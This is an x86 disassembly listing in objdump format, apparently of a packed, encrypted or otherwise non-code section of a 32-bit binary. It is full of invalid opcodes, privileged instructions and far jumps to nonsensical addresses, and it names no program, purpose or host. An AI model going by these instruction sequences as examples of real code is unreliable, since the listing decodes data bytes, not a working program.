  405f94:	82 bd 7e 04 bf ff 3e 	cmpb   $0x3e,-0x40fb82(%ebp)
  405f9b:	86 0f                	xchg   %cl,(%edi)
  405f9d:	ff cb                	dec    %ebx
  405f9f:	32 be ff 89 ed 08    	xor    0x8ed89ff(%esi),%bh
  405fa5:	a9 f6 b2 03 eb       	test   $0xeb03b2f6,%eax
  405faa:	2d 19 1a ff eb       	sub    $0xebff1a19,%eax
  405faf:	35 ac f0 90 5b       	xor    $0x5b90f0ac,%eax
  405fb4:	e9 03 61 ee 20       	jmp    0x212ec0bc
  405fb9:	ac                   	lods   %ds:(%esi),%al
  405fba:	66 8d                	data16 (bad)
  405fbc:	e9 03 65 53 0e       	jmp    0xe93c4c4
  405fc1:	39 46 73             	cmp    %eax,0x73(%esi)
  405fc4:	27                   	daa
  405fc5:	d6                   	(bad)
  405fc6:	3e 5b                	ds pop %ebx
  405fc8:	6c                   	insb   (%dx),%es:(%edi)
  405fc9:	89 0a                	mov    %ecx,(%edx)
  405fcb:	65 f6 be 8e 64 34 cc 	idivb  %gs:-0x33cb9b72(%esi)
  405fd2:	28 64 e6 ab          	sub    %ah,-0x55(%esi,%eiz,8)
  405fd6:	90                   	nop
  405fd7:	8c e9                	mov    %gs,%ecx
  405fd9:	03 27                	add    (%edi),%esp
  405fdb:	5e                   	pop    %esi
  405fdc:	d6                   	(bad)
  405fdd:	be 11 64 94 cb       	mov    $0xcb946411,%esi
  405fe2:	08 64 c6 ab          	or     %ah,-0x55(%esi,%eax,8)
  405fe6:	c2 8c e9             	ret    $0xe98c
  405fe9:	03 c5                	add    %ebp,%eax
  405feb:	97                   	xchg   %eax,%edi
  405fec:	12 cd                	adc    %ch,%cl
  405fee:	fd                   	std
  405fef:	0d 62 af 00 00       	or     $0xaf62,%eax
	...
  40601c:	bd 9e 95 53 8d       	mov    $0x8d53959e,%ebp
  406021:	0a 3b                	or     (%ebx),%bh
  406023:	57                   	push   %edi
  406024:	70 d0                	jo     0x405ff6
  406026:	2c 10                	sub    $0x10,%al
  406028:	c3                   	ret
  406029:	d2 69 03             	shrb   %cl,0x3(%ecx)
  40602c:	3e 5b                	ds pop %ebx
  40602e:	74 17                	je     0x406047
  406030:	fb                   	sti
  406031:	5a                   	pop    %edx
  406032:	e9 03 3e d0 91       	jmp    0x92109e3a
  406037:	8a 86 99 81 05 b7    	mov    -0x48fa7e67(%esi),%al
  40603d:	1d 55 8a 23 53       	sbb    $0x53238a55,%eax
  406042:	ea bc 80 5b 69 82 9d 	ljmp   $0x9d82,$0x695b80bc
  406049:	23 02                	and    (%edx),%eax
  40604b:	bb bd 5f 01 32       	mov    $0x32015fbd,%ebx
  406050:	30 58 42             	xor    %bl,0x42(%eax)
  406053:	7b fe                	jnp    0x406053
  406055:	5a                   	pop    %edx
  406056:	00 e9                	add    %ch,%cl
  406058:	3d 30 c3 ea a5       	cmp    $0xa5eac330,%eax
  40605d:	63 45 15             	arpl   %ax,0x15(%ebp)
  406060:	b2 0b                	mov    $0xb,%dl
  406062:	38 6c 16 6b          	cmp    %ch,0x6b(%esi,%edx,1)
  406066:	c7                   	(bad)
  406067:	ef                   	out    %eax,(%dx)
  406068:	3a 38                	cmp    (%eax),%bh
  40606a:	45                   	inc    %ebp
  40606b:	86 80 1c 04 70 d4    	xchg   %al,-0x2b8ffbe4(%eax)
  406071:	95                   	xchg   %eax,%ebp
  406072:	ef                   	out    %eax,(%dx)
  406073:	26 83 53 fe 15       	adcl   $0x15,%es:-0x2(%ebx)
  406078:	b7 c3                	mov    $0xc3,%bh
  40607a:	c7                   	(bad)
  40607b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40607c:	39 e9                	cmp    %ebp,%ecx
  40607e:	53                   	push   %ebx
  40607f:	1b 00                	sbb    (%eax),%eax
	...
  4060a9:	00 4a 62             	add    %cl,0x62(%edx)
  4060ac:	75 cd                	jne    0x40607b
  4060ae:	db e8                	fucomi %st(0),%st
  4060b0:	07                   	pop    %es
  4060b1:	64 79 6b             	fs jns 0x40611f
  4060b4:	50                   	push   %eax
  4060b5:	c1 31 5b             	shll   $0x5b,(%ecx)
  4060b8:	00 e9                	add    %ch,%cl
  4060ba:	c1 a4 04 e9 3d 5b 8b 	shll   $0x34,-0x74a4c217(%esp,%eax,1)
  4060c1:	34 
  4060c2:	4a                   	dec    %edx
  4060c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4060c4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4060c5:	0f 8b 05 59 42 82    	jnp    0x8282b9d0
  4060cb:	94                   	xchg   %eax,%esp
  4060cc:	c2 ed 3d             	ret    $0x3ded
  4060cf:	08 8b 85 bf 97 fc    	or     %cl,-0x368407b(%ebx)
  4060d5:	37                   	aaa
  4060d6:	73 0b                	jae    0x4060e3
  4060d8:	53                   	push   %ebx
  4060d9:	18 6c d6 75          	sbb    %ch,0x75(%esi,%edx,8)
  4060dd:	ed                   	in     (%dx),%eax
  4060de:	c6                   	(bad)
  4060df:	e0 07                	loopne 0x4060e8
  4060e1:	62                   	(bad)
  4060e2:	f9                   	stc
  4060e3:	4a                   	dec    %edx
  4060e4:	89 24 7e             	mov    %esp,(%esi,%edi,2)
  4060e7:	d6                   	(bad)
  4060e8:	07                   	pop    %es
  4060e9:	72 03                	jb     0x4060ee
  4060eb:	57                   	push   %edi
  4060ec:	8b ae 45 d6 57 e5    	mov    -0x1aa829bb(%esi),%ebp
  4060f2:	c6                   	(bad)
  4060f3:	64 33 53 9f          	xor    %fs:-0x61(%ebx),%edx
  4060f7:	65 33 00             	xor    %gs:(%eax),%eax
  4060fa:	fd                   	std
  4060fb:	d1 84 07 7f fa 69 d7 	roll   -0x28960581(%edi,%eax,1)
  406102:	64 58                	fs pop %eax
  406104:	c1 c0 60             	rol    $0x60,%eax
  406107:	5b                   	pop    %ebx
  406108:	c3                   	ret
  406109:	8b 1c 6c             	mov    (%esp,%ebp,2),%ebx
  40610c:	f8                   	clc
  40610d:	23 00                	and    (%eax),%eax
	...
  406137:	00 1f                	add    %bl,(%edi)
  406139:	6c                   	insb   (%dx),%es:(%edi)
  40613a:	f8                   	clc
  40613b:	8d                   	(bad)
  40613c:	d3 47 56             	roll   %cl,0x56(%edi)
  40613f:	b7 20                	mov    $0x20,%bh
  406141:	af                   	scas   %es:(%edi),%eax
  406142:	03 56 53             	add    0x53(%esi),%edx
  406145:	9d                   	popf
  406146:	c2 0c 24             	ret    $0x240c
  406149:	8e 8b f8 f4 a2 23    	mov    0x23a2f4f8(%ebx),%cs
  40614f:	fa                   	cli
  406150:	e4 a2                	in     $0xa2,%al
  406152:	8d 8c 28 83 70 20 43 	lea    0x43207083(%eax,%ebp,1),%ecx
  406159:	5c                   	pop    %esp
  40615a:	4e                   	dec    %esi
  40615b:	08 e6                	or     %ah,%dh
  40615d:	9c                   	pushf
  40615e:	11 03                	adc    %eax,(%ebx)
  406160:	dd d2                	fst    %st(2)
  406162:	fa                   	cli
  406163:	33 ff                	xor    %edi,%edi
  406165:	7a f8                	jp     0x40615f
  406167:	33 ff                	xor    %edi,%edi
  406169:	d0 9c 1f f9 8f bd c1 	rcrb   -0x3e427007(%edi,%ebx,1)
  406170:	d4 ff                	aam    $0xff
  406172:	0b c1                	or     %ecx,%eax
  406174:	94                   	xchg   %eax,%esp
  406175:	47                   	inc    %edi
  406176:	03 d9                	add    %ecx,%ebx
  406178:	4c                   	dec    %esp
  406179:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40617a:	33 fa                	xor    %edx,%edi
  40617c:	04 a3                	add    $0xa3,%al
  40617e:	33 fa                	xor    %edx,%edi
  406180:	6a da                	push   $0xffffffda
  406182:	07                   	pop    %es
  406183:	af                   	scas   %es:(%edi),%eax
  406184:	c8 21 f5 03          	enter  $0xf521,$0x3
  406188:	61                   	popa
  406189:	47                   	inc    %edi
  40618a:	c1 c0 a0             	rol    $0xa0,%eax
  40618d:	5a                   	pop    %edx
  40618e:	c3                   	ret
  40618f:	8b 2c 6b             	mov    (%ebx,%ebp,2),%ebp
  406192:	f8                   	clc
  406193:	23 1f                	and    (%edi),%ebx
  406195:	6b f8 8d             	imul   $0xffffff8d,%eax,%edi
  406198:	13 47 2a             	adc    0x2a(%edi),%eax
  40619b:	c6 00 00             	movb   $0x0,(%eax)
	...
  4061c6:	3e f1                	ds int1
  4061c8:	43                   	inc    %ebx
  4061c9:	03 f0                	add    %eax,%esi
  4061cb:	67 c2 c2 32          	addr16 ret $0x32c2
  4061cf:	75 d3                	jne    0x4061a4
  4061d1:	8b 76 64             	mov    0x64(%esi),%esi
  4061d4:	b8 23 74 64 b8       	mov    $0xb8647423,%eax
  4061d9:	8d ba 80 10 46 2e    	lea    0x2e461080(%edx),%edi
  4061df:	0c 00                	or     $0x0,%al
  4061e1:	4e                   	dec    %esi
  4061e2:	36 33 c2             	ss xor %edx,%eax
  4061e5:	11 3d 3e 88 fa 0d    	adc    %edi,0xdfa883e
  4061eb:	4c                   	dec    %esp
  4061ec:	e0 f8                	loopne 0x4061e6
  4061ee:	0d 5c 8e 9c 59       	or     $0x599c8e5c,%eax
  4061f3:	73 96                	jae    0x40618b
  4061f5:	46                   	inc    %esi
  4061f6:	33 76 5d             	xor    0x5d(%esi),%esi
  4061f9:	1c ff                	sbb    $0xff,%al
  4061fb:	35 15 03 07 ee       	xor    $0xee070315,%eax
  406200:	bc 33 14 56 bf       	mov    $0xbf561433,%esp
  406205:	33 14 f8             	xor    (%eax,%edi,8),%edx
  406208:	7f 07                	jg     0x406211
  40620a:	e6 ea                	out    %al,$0xea
  40620c:	83 69 3d 30          	subl   $0x30,0x3d(%ecx)
  406210:	e4 c0                	in     $0xc0,%al
  406212:	fe                   	(bad)
  406213:	79 06                	jns    0x40621b
  406215:	c3                   	ret
  406216:	c5 ad f7 f8 1d aa    	lds    -0x55e20709(%ebp),%ebp
  40621c:	f7 f8                	idiv   %eax
  40621e:	b3 de                	mov    $0xde,%bl
  406220:	12 af d1 36 8f 03    	adc    0x38f36d1(%edi),%ch
  406226:	68 8e c4 c2 00       	push   $0xc2c48e
	...
  406253:	00 3a                	add    %bh,(%edx)
  406255:	75 d3                	jne    0x40622a
  406257:	8b c6                	mov    %esi,%eax
  406259:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40625a:	be 23 b4 a5 be       	mov    $0xbea5b423,%esi
  40625f:	8d                   	(bad)
  406260:	c2 79 74             	ret    $0x7479
  406263:	5b                   	pop    %ebx
  406264:	a9 f1 06 4e 56       	test   $0x564e06f1,%eax
  406269:	5b                   	pop    %ebx
  40626a:	28 c5                	sub    %al,%ch
  40626c:	2f                   	das
  40626d:	5c                   	pop    %esp
  40626e:	33 8f 94 2c 51 e7    	xor    -0x18aed36c(%edi),%ecx
  406274:	86 2c 51             	xchg   %ch,(%ecx,%edx,2)
  406277:	89 a2 40 87 d3 1a    	mov    %esp,0x1ad38740(%edx)
  40627d:	d2 ea                	shr    %cl,%dl
  40627f:	59                   	pop    %ecx
  406280:	22 9a 2a 12 3d 82    	and    -0x7dc2edd6(%edx),%bl
  406286:	62 bd 2d 65 ca be    	bound  %edi,-0x41359ad3(%ebp)
  40628c:	0d 65 6c 80 39       	or     $0x39806c65,%eax
  406291:	3d f8 93 d5 5b       	cmp    $0x5bd593f8,%eax
  406296:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406297:	f3 7e 9b             	repz jle 0x406235
  40629a:	ee                   	out    %al,(%dx)
  40629b:	06                   	push   %es
  40629c:	fd                   	std
  40629d:	d3 02                	roll   %cl,(%edx)
  40629f:	f7 36                	divl   (%esi)
  4062a1:	3c f1                	cmp    $0xf1,%al
  4062a3:	f6 26                	mulb   (%esi)
  4062a5:	ce                   	into
  4062a6:	55                   	push   %ebp
  4062a7:	13 cd                	adc    %ebp,%ecx
  4062a9:	e9 80 b8 3d 09       	jmp    0x97e1b2e
  4062ae:	15 c5 fc 4e ea       	adc    $0xea4efcc5,%eax
  4062b3:	d3 b5 62 1a bf 00    	shll   %cl,0xbf1a62(%ebp)
	...
  4062e1:	00 5d 65             	add    %bl,0x65(%ebp)
  4062e4:	fa                   	cli
  4062e5:	be cb ce ee 89       	mov    $0x89eececb,%esi
  4062ea:	7d e2                	jge    0x4062ce
  4062ec:	8e 06                	mov    (%esi),%es
  4062ee:	78 23                	js     0x406313
  4062f0:	a8 c4                	test   $0xc4,%al
  4062f2:	4f                   	dec    %edi
  4062f3:	5c                   	pop    %esp
  4062f4:	b3 8e                	mov    $0x8e,%bl
  4062f6:	d4 2b                	aam    $0x2b
  4062f8:	a1 e6 d6 2b 91       	mov    0x912bd6e6,%eax
  4062fd:	88 aa 3f c8 0b 8a    	mov    %ch,-0x75f437c1(%edx)
  406303:	11 ea                	adc    %ebp,%edx
  406305:	59                   	pop    %ecx
  406306:	7a 9a                	jp     0x4062a2
  406308:	aa                   	stos   %al,%es:(%edi)
  406309:	11 3d 82 00 62 ea    	adc    %edi,0xea620082
  40630f:	2b fb                	sub    %ebx,%edi
  406311:	ca e3 2b             	lret   $0x2be3
  406314:	f9                   	stc
  406315:	74 19                	je     0x406330
  406317:	58                   	pop    %eax
  406318:	62 04 34             	bound  %eax,(%esp,%esi,1)
  40631b:	69 03 af 89 9a c0    	imul   $0xc09a89af,(%ebx),%eax
  406321:	e4 38                	in     $0x38,%al
  406323:	9c                   	pushf
  406324:	8b 42 70             	mov    0x70(%edx),%eax
  406327:	67 23 40 68          	and    0x68(%bx,%si),%eax
  40632b:	64 8d 5d 4c          	lea    %fs:0x4c(%ebp),%ebx
  40632f:	1b b3 a9 7d 5b 56    	sbb    0x565b7da9(%ebx),%esi
  406335:	01 83 9c 09 ea 6d    	add    %eax,0x6dea099c(%ebx)
  40633b:	d3 f8                	sar    %cl,%eax
  40633d:	da 8b 3b fb da 85    	fimull -0x7a2504c5(%ebx)
  406343:	cd 8c                	int    $0x8c
  406345:	f6 00 00             	testb  $0x0,(%eax)
	...
  406370:	92                   	xchg   %eax,%edx
  406371:	01 5e c7             	add    %ebx,-0x39(%esi)
  406374:	38 0d 2c 28 02 4e    	cmp    %cl,0x4e02282c
  40637a:	03 23                	add    (%ebx),%esp
  40637c:	b0 61                	mov    $0x61,%al
  40637e:	33 e0                	xor    %eax,%esp
  406380:	23 67 33             	and    0x33(%edi),%esp
  406383:	e3 b9                	jecxz  0x40633e
  406385:	bf 1f 83 ff a5       	mov    $0xa5ff831f,%edi
  40638a:	e9 ea 27 9c c3       	jmp    0xc3dc8b79
  40638f:	dd 42 84             	fldl   -0x7c(%edx)
  406392:	8b c0                	mov    %eax,%eax
  406394:	eb 61                	jmp    0x4063f7
  406396:	23 b3 f3 63 8d 65    	and    0x658d63f3(%ebx),%esi
  40639c:	3f                   	aas
  40639d:	00 10                	add    %dl,(%eax)
  40639f:	d6                   	(bad)
  4063a0:	ef                   	out    %eax,(%dx)
  4063a1:	5a                   	pop    %edx
  4063a2:	46                   	inc    %esi
  4063a3:	f5                   	cmc
  4063a4:	fc                   	cld
  4063a5:	9b                   	fwait
  4063a6:	05 ea 02 d3 fb       	add    $0xfbd302ea,%eax
  4063ab:	da 85 3a f9 00 f4    	fiaddl -0xbff06c6(%ebp)
  4063b1:	9f                   	lahf
  4063b2:	8d 94 88 07 14 44 95 	lea    -0x6abbebf9(%eax,%ecx,4),%edx
  4063b9:	57                   	push   %edi
  4063ba:	56                   	push   %esi
  4063bb:	28 d6                	sub    %dl,%dh
  4063bd:	95                   	xchg   %eax,%ebp
  4063be:	09 03                	or     %eax,(%ebx)
  4063c0:	57                   	push   %edi
  4063c1:	d0 f8                	sar    %al
  4063c3:	33 1d 78 fa 33 ef    	xor    0xef33fa78,%ebx
  4063c9:	d5 8c                	aad    $0x8c
  4063cb:	0f 16 b9 a1 d8 64 14 	movhps 0x1464d8a1(%ecx),%xmm7
  4063d2:	3c c1                	cmp    $0xc1,%al
	...
  4063fc:	00 00                	add    %al,(%eax)
  4063fe:	26 51                	es push %ecx
  406400:	03 ca                	add    %edx,%ecx
  406402:	dc 9c 33 f9 34 9f 33 	fcompl 0x339f34f9(%ebx,%esi,1)
  406409:	fa                   	cli
  40640a:	d2 c2                	rol    %cl,%dl
  40640c:	1f                   	pop    %ds
  40640d:	c8 1c 88 e7          	enter  $0x881c,$0xe7
  406411:	03 91 4a c1 c3 4b    	add    0x4bc3c14a(%ecx),%edx
  406417:	57                   	push   %edi
  406418:	d9 8b 3e 68 fa 23    	(bad)  0x23fa683e(%ebx)
  40641e:	3d 68 f8 8d 9b       	cmp    $0x9b8df868,%eax
  406423:	5c                   	pop    %esp
  406424:	e6 cd                	out    %al,$0xcd
  406426:	36 7a 02             	ss jp  0x40642b
  406429:	46                   	inc    %esi
  40642a:	4b                   	dec    %ebx
  40642b:	9a c0 05 24 97 8b fb 	lcall  $0xfb8b,$0x972405c0
  406432:	24 9f                	and    $0x9f,%al
  406434:	23 f9                	and    %ecx,%edi
  406436:	24 a0                	and    $0xa0,%al
  406438:	8d 94 18 8c 07 37 a4 	lea    -0x5bc8f874(%eax,%ebx,1),%edx
  40643f:	56                   	push   %esi
  406440:	56                   	push   %esi
  406441:	38 96 97 09 03 c7    	cmp    %dl,-0x38fcf669(%esi)
  406447:	ce                   	into
  406448:	f8                   	clc
  406449:	33 9d 76 fa 33 9f    	xor    -0x60cc058a(%ebp),%ebx
  40644f:	d4 8c                	aam    $0x8c
  406451:	0f 3e                	(bad)
  406453:	ed                   	in     (%dx),%eax
  406454:	05 d5 ca 70 49       	add    $0x4970cad5,%eax
  406459:	0c 7f                	or     $0x7f,%al
  40645b:	b2 09                	mov    $0x9,%dl
  40645d:	03 84 e8 bc 33 00 00 	add    0x33bc(%eax,%ebp,8),%eax
	...
  40648c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40648d:	90                   	nop
  40648e:	bb 33 a4 fe 96       	mov    $0x96fea433,%ebx
  406493:	1f                   	pop    %ds
  406494:	ab                   	stos   %eax,%es:(%edi)
  406495:	5f                   	pop    %edi
  406496:	5d                   	pop    %ebp
  406497:	45                   	inc    %ebp
  406498:	3d 9e e3 c0 7d       	cmp    $0x7dc0e39e,%eax
  40649d:	5f                   	pop    %edi
  40649e:	04 d9                	add    $0xd9,%al
  4064a0:	b5 0a                	mov    $0xa,%ch
  4064a2:	f4                   	hlt
  4064a3:	fa                   	cli
  4064a4:	1d 1a f4 f8 c3       	sbb    $0xc3f8f41a,%eax
  4064a9:	f7 ff                	idiv   %edi
  4064ab:	04 57                	add    $0x57,%al
  4064ad:	10 6a 03             	adc    %ch,0x3(%edx)
  4064b0:	f8                   	clc
  4064b1:	67 c2 c0 43          	addr16 ret $0x43c0
  4064b5:	71 c4                	jno    0x40647b
  4064b7:	8b 55 80             	mov    -0x80(%ebp),%edx
  4064ba:	bb 23 47 80 bc       	mov    $0xbc804723,%ebx
  4064bf:	8d aa 64 bb a3 29    	lea    0x29a3bb64(%edx),%ebp
  4064c5:	57                   	push   %edi
  4064c6:	04 56                	add    $0x56,%al
  4064c8:	46                   	inc    %esi
  4064c9:	33 c5                	xor    %ebp,%eax
  4064cb:	09 3d 42 8c f8 6d    	or     %edi,0x6df88c42
  4064d1:	68 e3 fa 4d 7a       	push   $0x7a4dfae3
  4064d6:	89 8c 41 9b 02 6f a1 	mov    %ecx,-0x5e90fd65(%ecx,%eax,2)
  4064dd:	71 45                	jno    0x406524
  4064df:	1c ff                	sbb    $0xff,%al
  4064e1:	b3 06                	mov    $0x6,%bl
  4064e3:	03 04 ea             	add    (%edx,%ebp,8),%eax
  4064e6:	b9 33 f7 51 bc       	mov    $0xbc51f733,%ecx
  4064eb:	33 e4                	xor    %esp,%esp
  4064ed:	f7 97 1f 00 00 00    	notl   0x1f(%edi)
	...
  406517:	00 00                	add    %al,(%eax)
  406519:	00 b4 3e ea 8c 3d 5b 	add    %dh,0x5b3d8cea(%esi,%edi,1)
  406520:	47                   	inc    %edi
  406521:	f4                   	hlt
  406522:	fe                   	(bad)
  406523:	98                   	cwtl
  406524:	f5                   	cmc
  406525:	02 e7                	add    %bh,%ah
  406527:	d0 90 f3 c7 28 92    	rclb   -0x6dd7380d(%eax)
  40652d:	89 c2                	mov    %eax,%edx
  40652f:	54                   	push   %esp
  406530:	2b fd                	sub    %ebp,%edi
  406532:	b7 5c                	mov    $0x5c,%bh
  406534:	ea 3d 52 9a a9 00 3d 	ljmp   $0x3d00,$0xa99a523d
  40653b:	98                   	cwtl
  40653c:	62 bb 4d 62 1a bc    	bound  %edi,-0x43e59db3(%ebx)
  406542:	c3                   	ret
  406543:	c7                   	(bad)
  406544:	f6 84 90 ea 6d 03 e8 	testb  $0x3a,-0x17fc9216(%eax,%edx,4)
  40654b:	3a 
  40654c:	28 c2                	sub    %al,%dl
  40654e:	45                   	inc    %ebp
  40654f:	58                   	pop    %eax
  406550:	19 8b 76 28 42 f3    	sbb    %ecx,-0xcbdd78a(%ebx)
  406556:	67 ce                	addr16 into
  406558:	65 07                	gs pop %es
  40655a:	1c fa                	sbb    $0xfa,%al
  40655c:	4b                   	dec    %ebx
  40655d:	29 3d 0d d5 c4 7f    	sub    %edi,0x7fc4d50d
  406563:	4b                   	dec    %ebx
  406564:	ea c9 b5 61 da bb 0d 	ljmp   $0xdbb,$0xda61b5c9
  40656b:	62 5c 98 59          	bound  %ebx,0x59(%eax,%ebx,4)
  40656f:	4f                   	dec    %edi
  406570:	c1 a0 33 58 9f fb fe 	shll   $0xfe,-0x460a7cd(%eax)
